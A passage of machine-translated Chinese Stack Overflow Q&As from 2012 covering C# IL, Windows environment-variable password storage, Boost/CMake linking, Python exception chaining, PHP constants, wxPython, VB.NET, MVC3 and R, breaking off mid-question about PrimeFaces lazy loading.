请注意，它并不完全满足所有线程安全要求。例如，在这种情况下，我们开始增加值，但`dictionary`类上的引用已更改为全新的实例。但是如果您需要更高级别的线程安全，那么您需要实现自己的主动同步/锁定，这通常超出了编译器优化的范围。然而，据我所知，这并没有真正给处理增加任何重大影响（如果有的话），并且避免了这种情况。如果`dictionary`是*财产，情况尤其如此*不是您示例中的字段，在这种情况下，不解析属性获取器两次肯定是一种优化。（无论如何，您的实际代码是否使用字典的属性而不是您发布的字段？）

编辑：好吧，对于一个简单的方法：

```
public void IncrementDictionary() 
{
    dictionary[0]++;
} 
```

从 LINQPad 报告的 IL 是：

```
IL_0000:  nop         
IL_0001:  ldarg.0     
IL_0002:  ldfld       UserQuery.dictionary
IL_0007:  dup         
IL_0008:  stloc.0     
IL_0009:  ldc.i4.0    
IL_000A:  ldloc.0     
IL_000B:  ldc.i4.0    
IL_000C:  callvirt    System.Collections.Generic.Dictionary<System.Int32,System.Int32>.get_Item
IL_0011:  ldc.i4.1    
IL_0012:  add         
IL_0013:  callvirt    System.Collections.Generic.Dictionary<System.Int32,System.Int32>.set_Item
IL_0018:  nop         
IL_0019:  ret 
```

我不完全确定（我不是 IL wiz），但我认为该`dup`调用本质上将堆栈上的相同字典引用加倍，因此无论 get 和 set 调用都指向同一个字典。也许这正是 ILSpy 将其表示为 C# 代码的方式（至少与行为相同）。我认为。如果我错了，请纠正我，因为就像我说的那样，我还不知道我的手背上的 IL。

编辑：必须运行，但它的最后要点是：`++`并且`+=`不是原子操作，实际上执行指令比 C# 中描述的要复杂得多。因此，为了确保每个 get/increment/set 步骤都在同一个字典实例上执行（正如您在 C# 代码中所期望和要求的那样），对字典进行了本地引用以避免运行字段“ get" 操作两次，这可能导致指向一个新实例。ILSpy 如何描述索引 += 操作所涉及的所有工作取决于它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-27T23:26:44.570

您的编辑弄乱了您要显示的内容，但是`dictionary[key]++`制作临时副本的原因`dictionary`是它无法知道索引的 getter 是否`Dictionary<int,int>`会更改 field `dictionary`。规范表明，即使`dictionary`在索引 get 期间更改了字段，索引 put 仍将在同一个对象上执行。

顺便说一句，.net 确实应该（并且仍然应该）提供一种方法，通过该方法，类可以将属性公开为`ref`. 可以`Dictionary`提供方法`ActOnValue(TKey key, ActionByRef<TValue> action)`and `ActOnValue<TParam>(TKey key, ActionByRef<TValue, TParam> action, ref TParam param)`（假设`ActionByRef<T>`是 like`Action<T>`但声明的参数`ref`，也是如此`ActionByRef<T1,T2>`）。如果确实如此，则可以对集合对象执行读-修改-写操作，而无需两次索引该集合。不幸的是，没有以这种方式公开属性的标准约定，也没有任何语言支持。*

# encryption - 将密码存储在 Windows 用户环境变量中是不好的做法吗？

> ID：11235918
> 
> 赞同：3
> 
> 时间：2012-06-27T22:56:17.843
> 
> 标签：encryption, passwords, sysadmin, windows-server

我最近阅读了以下 SO 问题。

[在网络主机上存储密码或私钥的最佳方式是什么？](https://stackoverflow.com/questions/11232703/whats-the-best-way-to-store-a-password-or-private-key-on-a-web-host)

在撰写本文时，它提到了加密的连接字符串（用于 ASP.NET 应用程序）或使用数据保护 API (DPAPI)。对于该用户的特定用例，两者似乎都是很好的解决方案。

但是，传统上，我总是将敏感的配置值（如密码和连接字符串）存储在正在使用它们的服务器上的用户环境变量中。这些很容易定义、更改和阅读（从 IT 角度来看）。无论使用何种框架或语言，它们也很容易访问。

问题是：将敏感数据存储在 Windows 用户环境变量中是否是一种好习惯，如果不是，为什么？

编辑：

根据 Ken 的评论，一个先决条件应该是：Windows 注册表内容是否加密？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-06-28T00:45:22.913

您在用户或系统环境中存储的任何内容都以明文（非加密）形式存储在 NTUSER.DAT 和 SYSTEM 注册表文件中。它们不仅可以使用十六进制编辑器读取，甚至可以使用简单的文本编辑器或使用 grep 读取，如果您使用众多工具之一从注册表文件中解析/提取数据，则更容易。

示例（Windows 2008 Server，使用 RIP Linux 完成转储）：

这是环境变量对话框，我设置了一个用户变量（MySecretPassword=NobodyCanReadThis）和一个系统变量（MySystemSecret=NobodyCanReadThisEither）： ![Windows 环境变量对话框，包含一个用户和一个系统变量](../Images/0973bdd0f79a805db2b49af3b6c1e58e.png)

这是在安装 Windows NTFS 分区并在管理员目录中查找 NTUSER.DAT 文件后，在 Linux 中使用 hexedit 时的样子。您可以轻松搜索用户环境变量名称，并以明文形式找到其内容： ![NTUSER.DAT 的十六进制转储](../Images/66543803e74dc2f70f7f19f7839ed3dc.png)

这是 Windows\System32\Config 目录中的 SYSTEM 注册表文件。同样，您可以轻松搜索变量名称。在这种情况下，变量的值在变量名后面几个字节，但很容易发现： ![系统的十六进制转储](../Images/47fafdc33f7bbad52d38e4b3e544e23a.png)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-06-26T09:40:59.903

除了上面的答案，你可以用不同的用户登录，使用Sysinternals Process Explorer之类的工具来查看正在运行的进程。其中一个选项卡列出了进程正在运行的环境变量，包括不那么机密的用户环境变量。

当我看到这一点时感到震惊，现在已更改为使用只有运行该进程的用户才能访问的安全文件。

# c++ - 使用 cmake 和 vs2010 链接到静态 boost 库，无需自动链接

> ID：11235927
> 
> 赞同：3
> 
> 时间：2012-06-27T22:57:34.390
> 
> 标签：c++, visual-studio-2010, boost, cmake

我有一个链接到 boost_program_options 的应用程序，它的 CMakeLists.txt 看起来像

```
FIND_PACKAGE(Boost COMPONENTS program_options REQUIRED)
INCLUDE_DIRECTORIES(${Boost_INCLUDE_DIRS})
TARGET_LINK_LIBRARIES( ${SUBPROJECT_NAME} ${Boost_LIBRARIES} ) 
```

我`#define BOOST_ALL_NO_LIB`在代码中使用之前包括`<boost/program_options.hpp>`禁用vs2010中boost的自动链接，因为我想通过cmake指定它以使其与linux兼容。

在 Linux 中，这段代码编译得很好（使用 cmake、make 和 gcc）。但是在带有 VS2010 的 Windows 中，我得到了一个

```
2>App.obj : error LNK2001: unresolved external symbol "public: static unsigned int const boost::program_options::options_description::m_default_line_length" (?m_default_line_length@options_description@program_options@boost@@2IB)
2>App.obj : error LNK2001: unresolved external symbol "class std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> > boost::program_options::arg" (?arg@program_options@boost@@3V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@A) 
```

请注意，链接器会找到该库 - 如果它没有找到它，我会得到更多未解决的外部错误。

我将问题追踪到以下内容：http: [//lists.boost.org/boost-users/2009/11/54015.php](http://lists.boost.org/boost-users/2009/11/54015.php)很好地描述了正在发生的事情（这两个是全局变量）。现在建议的解决方案是启用动态链接并链接到 DLL。但这不是我想做的，我想链接到静态提升库（我实际上正在尝试这样做，在 VS 的 App 属性中的 Linker->Input it lists 下`D:\boost\boost_1_47\lib\boost_program_options-vc100-mt-gd-1_47.lib`。

我也尝试添加

```
set(Boost_USE_STATIC_LIBS        ON)
set(Boost_USE_MULTITHREADED      ON)
set(Boost_USE_STATIC_RUNTIME    OFF) 
```

到我的 CMakeLists.txt 但它不会改变任何东西。

任何想法如何解决这个问题？

更新：与 boost_program_options-vc100-mt-sgd-1_47.lib 链接时，我收到一大堆关于 CRT 符号已在 boost-lib 中定义的新链接器错误。按照 panickal 的建议更改 VS Runtime 选项后，这些错误也消失了，并且可以正常工作。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-06-28T00:07:58.673

您必须链接到静态库。尝试链接到`boost_program_options-vc100-mt-sgd-1_47.lib`而不是`boost_program_options-vc100-mt-gd-1_47.lib`.

表示库的`s`静态版本。您可以查看 Boost [Library Naming](http://www.boost.org/doc/libs/1_42_0/more/getting_started/windows.html#library-naming)以获取有关命名约定的更多详细信息。

更新：要修复多定义链接器错误，请将 Visual Studio 运行时库选项`Configuration Properties / C/C++ / Code Generation / Runtime Library`从 `Multi-threaded Debug DLL (/MDd)`更改为`Multi-threaded Debug (/MTd)`.

# python - __cause__ 和 __context__ 有什么区别？

> ID：11235932
> 
> 赞同：20
> 
> 时间：2012-06-27T22:58:15.440
> 
> 标签：python, exception, python-3.x

这些是 Python 异常的属性，但我很难理解它们。Python 的文档对此似乎相当安静。我看了看[文档](http://docs.python.org/py3k/reference/simple_stmts.html?highlight=__cause__#the-raise-statement)，但很困惑。那么，这两者有什么区别，又是如何使用的呢？

编辑：在那张纸条上`__traceback__`，如果有的话，它们有什么关系？

编辑3：我想我只是不明白`__cause__`。我终于明白`__traceback__`了`__context__`。为什么不`attribute_error.__cause__`参考`AttributeError()`？

```
try:
    raise NameError() from OSError
except NameError as name_error:
    print('name_error.__cause__: %s' % repr(name_error.__cause__))
    print('name_error.__context__: %s' % repr(name_error.__context__))
    print('name_error.__traceback__: %s' % repr(name_error.__traceback__))
    try:
        raise AttributeError()
    except AttributeError as attribute_error:
        print('attribute_error.__cause__: %s' % repr(attribute_error.__cause__))
        print('attribute_error.__context__: %s' % repr(attribute_error.__context__))
        print('attribute_error.__traceback__: %s' % repr(attribute_error.__traceback__))
        raise attribute_error from IndexError 
```

这输出

```
name_error.__cause__: OSError()
name_error.__context__: None
name_error.__traceback__: <traceback object at 0x000000000346CAC8>
attribute_error.__cause__: None
attribute_error.__context__: NameError()
attribute_error.__traceback__: <traceback object at 0x000000000346CA88>
Traceback (most recent call last):
  File "C:\test\test.py", line 13, in <module>
    raise attribute_error from IndexError
  File "C:\test\test.py", line 8, in <module>
    raise AttributeError()
AttributeError 
```

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2012-06-27T23:01:05.840

`__cause__`是异常的原因 - 由于给定的异常，引发了当前异常。这是一个直接链接 - X 抛出了这个异常，因此 Y 必须抛出这个异常。

`__context__`另一方面意味着当前异常是在尝试处理另一个异常时引发的，并定义了在引发该异常时正在处理的异常。这样您就不会失去其他异常发生的事实（因此在此代码中抛出异常） - 上下文。X 抛出了这个异常，在处理它时，Y 也被抛出了。

`__traceback__`向您展示堆栈 - 为到达当前代码行所遵循的各个级别的函数。这使您可以查明导致异常的原因。它很可能用于（可能与 一起使用`__context__`）来查找导致给定错误的原因。

# openssl - 非 sha256 字符

> ID：11235934
> 
> 赞同：1
> 
> 时间：2012-06-27T22:58:33.300
> 
> 标签：openssl

我正在尝试将多个 sha256 散列字符串存储为带有分隔符的单个字符串。我以前使用 MD5 并且能够使用“，”。但似乎逗号是 sha256 哈希生成的字符之一。所以我的问题是：是否有任何*可打印*的（我意识到可以使用一些不可打印的）ASCII 字符，这些字符永远不会在 sha256 哈希中使用？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-27T23:05:25.697

听起来您之前没有将生成的 sha256 哈希转换为十六进制格式，因为哈希本身只是一个数字（因此逗号可以出现在 MD5 哈希中）。

# php - PHP未定义常量错误没有意义

> ID：11235940
> 
> 赞同：6
> 
> 时间：2012-06-27T22:59:00.260
> 
> 标签：php, class, constants, undefined

我真的希望我在这里错过了一些简单的事情，但是我在 PHP 中使用类常量遇到了一个奇怪的问题。我创建了一个名为 Utils 的简单类，并添加了两个类常量 CRYPT_SALT 和 LOGIN_PAGE。我从其他文件中引用了这些，并且它们起作用了。然后我又添加了五个类常量，但它们不起作用。我得到“致命错误：在线 /var/www/modx/test.php 中未定义的类常量”，这是新常量之一，也是我尝试使用它的行。

这是 Utils 类：

```
<?php
// 
// Utils.php
//  
// This class is a collection of static utility functions.  Since the methods are static, they should
// all be invoked with:
//
//  Utils::methodName();
//
// This class also contains global constants, which are *not* kept in Config.  They should be accessed with:
//
//  Utils::CONSTANT;
// 
// addToCSVString -- adds an incoming string to a CSV string, possibly prepending a comma and space.  Returns
// addToJSONString -- adds an incoming key/value pair to a JSON string
// jsonify -- takes in a string and replaces control characters and quotes with properly
//

require_once( "logger.php" );

class Utils {

        // Constants 

    const CRYPT_SALT    = '$6$';
    const LOGIN_PAGE    = '/modx/';

        // Session keys

    const SKEY_DEBUG    = 'debug';
    const SKEY_LOGIN    = 'login';
    const SKEY_LANG     = 'curLang';
    const SKEY_UID      = 'userID';
    const SKEY_LOGGER   = 'logger';

        // Members

    public static $debug    = false;

        // Methods

    //
    // addToCSVString -- adds an incoming string to a CSV string, possibly prepending a comma and space.  Returns
    // the new string
    //
    public static function addToCSVString( $csvString, $newVal ) {
        if ( strlen( $csvString ) > 0 ) {
            $csvString  .= ", ";
        }

        return $csvString . $newVal;
    }

    //
    // addToJSONString -- adds an incoming key/value pair to a JSON string
    //
    public static function addToJSONString( $jsonString, $key, $val ) {
        $debug      = self::$debug;

        if ( $debug ) {
            $logger = Logger::singleton();
            $logger->log( "In Utils::addToJSONString" );
            $logger->log( "\$key = [$key]", 1 );
            $logger->log( "\$val = [$val]", 1 );
        }

        if ( strpos( $val, "{" ) === false ) {

            if ( $debug ) {
                $logger->log( "Utils: this is a plain value", 1 );
            }
                // Val is a string

            $val    = self::jsonify( $val );

            return self::addToCSVString( $jsonString, "\"" . $key . "\" : \"" . $val . "\"" );
        } else {
            if ( $debug ) {
                $logger->log( "this is a JSON object", 1 );
            }

                // Val is a JSON object

            return self::addToCSVString( $jsonString, "\"" . $key . "\" : " . $val . "" );
        }
    }

    //
    // jsonify -- takes in a string and replaces control characters and quotes with properly
    // escaped JSON values
    //
    public static function jsonify( $val ) {
        $val    = str_replace( '\\', '\\\\', $val );        // convert backslashes first 
        $val    = str_replace( "\n", '\\n', $val );
        $val    = str_replace( "\r", '\\r', $val );
        $val    = str_replace( "\t", '\\t', $val );
        $val    = str_replace( "\v", '\\v', $val );
        $val    = str_replace( "\f", '\\f', $val );
        $val    = str_replace( "\n", '\\n', $val );
        $val    = str_replace( "\n", '\\n', $val );

        return $val;
    }

}

?> 
```

在我添加类常量之前，所有成员函数都已编写和测试，它们正在工作。

这里是 test.php，一个简单的测试页面来说明问题：

```
<h1>Test.php</h1>

<?php

    // Set up autoloader

spl_autoload_extensions( '.php,.inc' );
spl_autoload_register();

    // Test class constants

echo "<b>Testing Utils class constants</b></br>\n"; 
echo 'Utils::CRYPT_SALT = [' . Utils::CRYPT_SALT . "]<br>\n";
echo 'Utils::LOGIN_PAGE = [' . Utils::LOGIN_PAGE . "]<br>\n";
echo 'Utils::SKEY_LOGGER = [' . Utils::SKEY_LOGGER . "]<br>\n";
echo 'Utils::SKEY_DEBUG = [' . Utils::SKEY_DEBUG . "]<br>\n";
echo 'Utils::SKEY_LOGIN = [' . Utils::SKEY_LOGIN . "]<br>\n";
echo 'Utils::SKEY_LANG = [' . Utils::SKEY_LANG . "]<br>\n";
echo 'Utils::SKEY_UID = [' . Utils::SKEY_UID . "]<br>\n";
echo "</br>\n";

?> 
```

我从 test.php 得到的确切错误是：

```
Fatal error: Undefined class constant 'SKEY_LOGGER' in /var/www/modx/test.php on line 15 
```

我尝试了以下方法来解决这个问题：

-- 重命名常量，包括使用不带下划线的小写名称

-- 更改声明的顺序。

- 从双引号更改为单引号。

-- 注释掉 CRYPT_SALT 和 LOGIN_PAGE 的声明

-- 把这段代码展示给我的同事，他们都一无所知

无论我尝试什么，CRYPT_SALT 和 LOGIN_PAGE 都可以工作，其他常量都不起作用。恐怕我遇到了 PHP 类系统深处的一些错误。或者也许我只是盯着这个看太久了，以至于我错过了明显的东西。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-28T19:39:57.563

是的，

答案是我像往常一样是个白痴。:)

我在 web 的主目录中有第二个 utils.php 副本。较早的版本（仅定义了 CRYPT_SALT 和 LOGIN_PAGE）是自动加载器首先找到的版本。

@Paolo Bergantino 和@David，您建议确保我包含我认为的文件是非常正确的。@hakre，感谢 get_included_files 提示。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-28T07:21:44.973

我在我的系统中尝试了你的代码。

如果您删除`"require_once( "logger.php" );"`into `Utils.php`，它的工作正常。

所以，我在你的`lonnger.php`文件中有问题。

试试看。

# wxpython - 如何使用对话框启动 wxPython 程序，然后弹出另一个对话框，然后制作基本画布

> ID：11235944
> 
> 赞同：0
> 
> 时间：2012-06-27T22:59:33.000
> 
> 标签：wxpython, wxwidgets

> **可能重复：**
> [如何在 wxPython 中链接多个 wx.Dialogs](https://stackoverflow.com/questions/11215632/how-to-link-multiple-wx-dialogs-in-wxpython)

嗨，我想制作一个 wxPython 应用程序，它首先显示一个 messageDialog，然后是一个输入对话框（保存 playerName），然后制作一个 dc（DrawCanvas）。

任何人都可以为我建立这个框架吗？（我一直把面板与框架和对话框混为一谈）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T13:43:54.580

我已经回答了这个问题，但我的回答又是这样：只需将对话框创建和实例化放在 Panel 之后。**init**和其他任何事情之前。这里还有一些示例代码：

```
import wx

########################################################################
class MyDlg(wx.Dialog):
    """"""

    #----------------------------------------------------------------------
    def __init__(self):
        """Constructor"""
        wx.Dialog.__init__(self, None, title="I'm a dialog!")

        lbl = wx.StaticText(self, label="Hi from the panel's init!")
        btn = wx.Button(self, id=wx.ID_OK, label="Close me")

        sizer = wx.BoxSizer(wx.VERTICAL)
        sizer.Add(lbl, 0, wx.ALL, 5)
        sizer.Add(btn, 0, wx.ALL, 5)
        self.SetSizer(sizer)

########################################################################
class MyPanel(wx.Panel):
    """"""

    #----------------------------------------------------------------------
    def __init__(self, parent):
        """Constructor"""
        wx.Panel.__init__(self, parent)

        # show a custom dialog
        dlg = MyDlg()
        dlg.ShowModal()
        dlg.Destroy()

        self.Bind(wx.EVT_PAINT, self.OnPaint)

    def OnPaint(self, evt):
        pdc = wx.PaintDC(self)
        try:
            dc = wx.GCDC(pdc)
        except:
            dc = pdc
        rect = wx.Rect(0,0, 100, 100)
        for RGB, pos in [((178,  34,  34), ( 50,  90)),
                         (( 35, 142,  35), (110, 150)),
                         ((  0,   0, 139), (170,  90))
                         ]:
            r, g, b = RGB
            penclr   = wx.Colour(r, g, b, wx.ALPHA_OPAQUE)
            brushclr = wx.Colour(r, g, b, 128)   # half transparent
            dc.SetPen(wx.Pen(penclr))
            dc.SetBrush(wx.Brush(brushclr))
            rect.SetPosition(pos)
            dc.DrawRoundedRectangleRect(rect, 8)

########################################################################
class MyFrame(wx.Frame):
    """"""

    #----------------------------------------------------------------------
    def __init__(self):
        """Constructor"""
        wx.Frame.__init__(self, None, title="Example frame")

        # show a MessageDialog
        style = wx.OK|wx.ICON_INFORMATION
        dlg = wx.MessageDialog(parent=None, 
                               message="Hello from the frame's init", 
                               caption="Information", style=style)
        dlg.ShowModal()
        dlg.Destroy()

        # create panel
        panel = MyPanel(self)

if __name__ == "__main__":
    app = wx.App(False)
    frame = MyFrame()
    frame.Show()
    app.MainLoop() 
```

# .net - Inherited ComboBox for Color 支持多次填充项目

> ID：11235947
> 
> 赞同：0
> 
> 时间：2012-06-27T22:59:54.393
> 
> 标签：.net, vb.net, winforms, combobox, visual-studio-2008-sp1

下面是继承的 ComboBox 的代码。问题是 ComboBox 被`PopulateComboBox()`多次填充 ( )。

**编辑：**我接受了**Amit Mittal**的建议（在下面找到他的答案）并实施了`ISupportInitialize`. 现在`PopulateComboBox()`只在运行时调用，就像它应该的那样。

通过这种实现，项目应该在运行时填充，并在退出时销毁。但是，设计器本身在运行时创建这些值时存储这些值，而不是在运行时销毁。

是否有一个优雅的解决方案来实现此代码？

```
Public Class ComboBoxExColors
    Inherits ComboBox
    Implements ISupportInitialize

    Public Sub New()
        MyBase.New()
        Me.Size = New Size(146, 23)
        Me.DropDownStyle = ComboBoxStyle.DropDownList
        Me.MaxDropDownItems = 16
    End Sub

    Public Sub BeginInit() Implements System.ComponentModel.ISupportInitialize.BeginInit
        ' Do nothing?
    End Sub

    Public Sub EndInit() Implements System.ComponentModel.ISupportInitialize.EndInit
        Me.DrawMode = DrawMode.OwnerDrawVariable ' fixed or variable?
        Me.PopulateComboBox()
    End Sub

    Public Sub PopulateComboBox()
        'Me.Items.Clear() ' rather than forcing items to be cleared, is there a more elegant solution to the implementation of this code, rather than forcing an item clear that shouldn't exist to begin with?
        Me.Items.Add("Default")
        Me.Items.Add("Custom")
        Dim KnownColors() As String = System.Enum.GetNames(GetType(System.Drawing.KnownColor)) ' get all colors
        For Each c As String In KnownColors ' add non system colors
            If Not Color.FromName(c).IsSystemColor Then
                Me.Items.Add(c)
            End If
        Next c
    End Sub

    Protected Overrides Sub OnDrawItem(ByVal e As DrawItemEventArgs)
        ' this draws each item onto the control
        If e.Index > -1 Then
            Dim item As String = Me.Items(e.Index).ToString

            e.DrawBackground()
            e.Graphics.DrawString(item, e.Font, SystemBrushes.WindowText, e.Bounds.X, e.Bounds.Y)
            e.DrawFocusRectangle()
        End If
    End Sub

End Class 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-28T09:50:16.410

问题是 PopulateComboBox 是从构造函数中调用的。

当您将组合框放在设计器表面时，设计器会在内部调用其构造函数以获取其属性（包括 Item 属性）的默认值。然后，后面的代码调用构造函数，然后显式指定设计时属性（在您的情况下，这似乎只是“默认”值）。因此重复项目。

初始化自定义控件的正确方法是实现[ISupportInitialize](http://msdn.microsoft.com/en-us/library/system.componentmodel.isupportinitialize.aspx)接口。

在设计器的代码应用了所有设计时属性后，EndInit 将被调用一次（如果您不使用设计器，那么调用它是您的责任）。

所以经验法则是

1.  对于默认值，在构造函数中指定
2.  要“初始化”，请使用 ISupportInitialize。

例如，除了从中调用 PopulateComboBox 之外，您还可以使用它将 DrawMode 属性强制为 OwnerDrawFixed，因为这对于您继承的控件至关重要，并且您不希望让控件的用户在设计时指定任何其他内容（尽管这不会完全阻止不同值的设计时“规范”，但不管在运行时如何，您总是会强制使用正确的值。）

笔记：

1.  实现此接口后，您可能需要重新构建项目，然后再次在设计器表面上对继承的控件进行“拖放”。您可以检查自动创建的设计器代码以验证 EndInit 确实被调用。
2.  同样如前所述，设计人员使用 ISupportInitialize。如果您不使用设计器，则调用其方法是您的责任。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T06:09:11.460

在调查您的问题时，我最初认为使用[DesignMode](http://msdn.microsoft.com/en-us/library/system.componentmodel.component.designmode.aspx)属性会阻止在将控件添加到表单时创建 ItemArray ...但它不起作用。

然后我将另一个 Visual Studio 实例附加到项目中，并注意到它`DesignMode`一直设置为 false。我无法找到另一个独特的属性，以防止您的控件在将 ItemArray 添加到表单时创建它（这是导致第一次加载数据的原因）。

您正在尝试做的事情是独一无二的，因为您将数据源构建到您的控件中并在每次创建它时运行它，而普通的 ComboBox 只会从属性或附加的数据源加载到数组中。

我目前唯一的建议是将您的`PopulateComboBox`方法从控件的构造函数中取出并在父表单的构造函数中调用它，或者动态创建它并将其添加到您的表单中。

IE

```
Public Class Form1
    Public Sub New()
        InitializeComponent()
        ComboBoxExColors1.PopulateComboBox()
    End Sub
End Class 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-27T23:32:37.030

它应该在 Sub New 中，除非您计划稍后动态更改值。

另外，我不知道你为什么需要清除数组。GC 会处理它。

# c# - MVC3 - UserId 的身份验证

> ID：11235949
> 
> 赞同：0
> 
> 时间：2012-06-27T23:00:10.147
> 
> 标签：c#, sql, asp.net-mvc-3, membership

要明确：我有两组用户 - GroupA - User1、User2 GroupB - User3、User4 Group A 执行 TaskA 并创建 TaskA 对象 Group B 执行 TaskB 并创建 TaskB 对象 基于角色防止 GroupA 编辑 TaskB 对象，反之亦然

ISSUE - User1 仍然可以编辑 User2 的 TaskA 对象

我已将 SqlMembership 集成到我的自定义数据库中，并且在我的自定义表中，我有一个 UserId 字段，它映射到 AspNet_User 表中的 GUID AspNet_UserId 列。用户可以创建作业，并且它与用户的 AspNet_UserId 相关联。

我的问题是我具有基于角色的安全性，但我还必须设置安全性，因此只有具有 UserId 的用户才能访问具有包含其 UserId 的模型数据的编辑视图。

我看过这篇文章 - [ASP.NET MVC 3 using Authentication](https://stackoverflow.com/questions/4237394/asp-net-mvc-3-using-authentication)

（但有 29 票赞成的答案的第一部分似乎不完整）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T01:28:39.710

# 解决方案 -

我还没有实现这个，但从我所看到的这就是我正在寻找的。我在这里找到它：[http ://forums.asp.net/t/1771733.aspx/1?Display+a+specific+data+for+User](http://forums.asp.net/t/1771733.aspx/1?Display+a+specific+data+for+User)

## 这有望使我不必看WIF ...

### *（保持我的手指交叉）*

员工控制器：

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Web.Mvc;
using System.Web.Security;

namespace UserDetails.Controllers
{
public class HomeController : Controller
{
    private readonly List<Employee> m_employees;

    public HomeController()
    {
        m_employees = new List<Employee>
                          {
                              new Employee
                                  {
                                      Id =  Guid.Parse("3aebbf53-3581-4822-bef4-c9701d927b93"),
                                      JobTitle = "Senior Developer",
                                      Manager = "Mr. Smith",
                                      Salary = 1500
                                  },

                                new Employee
                                    {
                                        Id= Guid.Parse("{3924afa7-d31b-4d30-b368-f825d4028779}"),
                                        JobTitle = "Lead Developer",
                                        Manager= "Mr. Doe",
                                        Salary = 2500
                                    }
                          };
    }

    public ActionResult Index()
    {
        if (User.Identity.IsAuthenticated)
        {
            MembershipUser currentUser = Membership.GetUser(User.Identity.Name, true /* userIsOnline */);

            if (currentUser != null && currentUser.ProviderUserKey != null && currentUser.IsApproved)
            {
                var currentUserId = (Guid)currentUser.ProviderUserKey;

                Employee result = (from employee in m_employees
                                   where employee.Id == currentUserId
                                   select employee).FirstOrDefault();

                return View(result);
            }
        }

        return View();
    }

    public ActionResult About()
    {
        return View();
    }
}

public class Employee
{
    public Guid Id { get; set; }
    public string JobTitle { get; set; }
    public string Manager { get; set; }
    public int Salary { get; set; }
}
} 
```

索引视图

```
@{
    ViewBag.Title = "Home Page";
}

@model UserDetails.Controllers.Employee

<p>

@if (Model != null && User.Identity.IsAuthenticated)
{
    <label>Your name is: </label>@User.Identity.Name <br/>
    <label>Your Job Title is: </label>@Model.JobTitle<br/>
    <label>Your Manager is: </label>@Model.Manager<br/>
    <label>And you earn way too less money: &euro;</label> @Model.Salary
} 
```

# r - 从R中的循环创建向量

> ID：11235950
> 
> 赞同：2
> 
> 时间：2012-06-27T23:00:24.630
> 
> 标签：r

我基本上是在尝试创建一个由 NA 和数字组成的向量，但顺序非常特殊。这是我到目前为止的代码：

```
x<-rep(rep(2:1,c(2,3)),40)
dummy=1
for (i in 0:length(x))
{ ifelse(x[i+1]==2, print(NA), print(dummy))
 if(i %% 5 == 0) dummy=i+1
} 
```

所以我的向量应该如下所示（NA、NA、1、1、1、NA、NA、6、6、6 等）。但是我不能以这种格式保存它，所以我可以稍后在矩阵中调用它。有什么建议么？我尝试过创建一个什么都没有的向量，然后将其填充到循环中，但这也无济于事。

利兹统计学生

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-27T23:42:30.033

经过我的很多固执之后，我学会了将这些东西完全矢量化，不确定这是否有助于您的特定情况，但我会写：

```
x<-rep(rep(2:1,c(2,3)),40) 
```

通过以下方式获得 x 的领先优势：

```
leadx=c(x[-1],NA) 
```

写出没有 NA 时你会得到的数字

```
filler=rep(5*0:7+1,each=5) 
```

得到一个用 NA 填充的正确大小的向量

```
y=rep(NA,length(x)) 
```

将填充器的值插入到您的 NA 向量中

```
y[which(leadx!=2)]=filler[which(leadx!=2)] 
```

检查出来：

```
head(y)

> [1] NA  1  1  1 NA NA  6  6  6 NA 
```

向量化的东西往往比 for 循环和 if 语句更快。祝你好运！

编辑：您可以在一行中完成所有操作：

```
y=ifelse(c(x[-1],NA)==2,NA,1)*rep(5*0:7+1,each=5) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-27T23:03:22.297

您需要将向量分配给某些东西，而不是调用`print`，否则它将打印到标准输出。

```
out <- vector(length=length(x))

for (i in 0:length(x)) { 
  out[i] <- ifelse(x[i+1]==2, NA, dummy)
  if(i %% 5 == 0) dummy=i+1
}

> head(out, 10)
 [1] NA  1  1  1 NA NA  6  6  6 NA
> 
```

# filter - 如何使用延迟加载在 primefaces 数据表中实现全局过滤器？

> ID：11235952
> 
> 赞同：2
> 
> 时间：2012-06-27T23:00:40.130
> 
> 标签：filter, primefaces, lazy-loading, global

我在本教程[http://uaihebert.com/?p=1120之后实现了lazyDataModel](http://uaihebert.com/?p=1120)

我的代码与本教程有点不同，这里是：

看法：

```
<p:dataTable id="tablaClientes"  value="#{AgendaManualMBean.allClientes}" 
   var="tablaClientes" 
   widgetVar="clienteTable" 
   rowKey="#{tablaClientes.clDocid}" 
   selection="#{AgendaManualMBean.ciatt001}" selectionMode="single"  rows="10" 
   lazy="true" paginatorPosition="top" 
   paginatorTemplate="{RowsPerPageDropdown}{FirstPageLink}{PreviousPageLink} 
   {CurrentPageReport} {NextPageLink} {LastPageLink}" rowsPerPageTemplate="5,10,15"
   emptyMessage="No existen clientes">

                <f:facet name="header" >  
                    <p:outputPanel>  
                        <h:outputText value="Busqueda " />  
                        <p:inputText id="globalFilter" onkeyup="clienteTable.filter()" 
                         style="width:150px"  size="10"/>  
                    </p:outputPanel>  
                </f:facet>  

                <p:column id="numOrdenColumn" filterBy="#{tablaClientes.clDocid}"  
                          width="50"              
                          headerText="Identificación" 

                          filterMatchMode="contains">  
                    <h:outputText value="#{tablaClientes.clDocid}" />  
                </p:column>  
                <p:column id="nomCliColumn" 
                          filterBy="#{tablaClientes.clNombre1}"   
                          width="250"

                          headerText="Cliente" 
                          filterMatchMode="contains">  
                    <h:outputText value="#{tablaClientes.clNombre1}" />  
                </p:column>  

            </p:dataTable> 
```

我的托管豆：

```
 public LazyDataModel<Ciatt001> getAllClientes() {
    if (listaClientesLazy == null) {
        listaClientesLazy = new LazyClienteModel(ambiente.getCodCia(),ambiente.getCodAge());
        //listaClientesLazy = new LazyClienteModelMBean();
    }

    return listaClientesLazy;
} 
```

我的懒惰数据模型

```
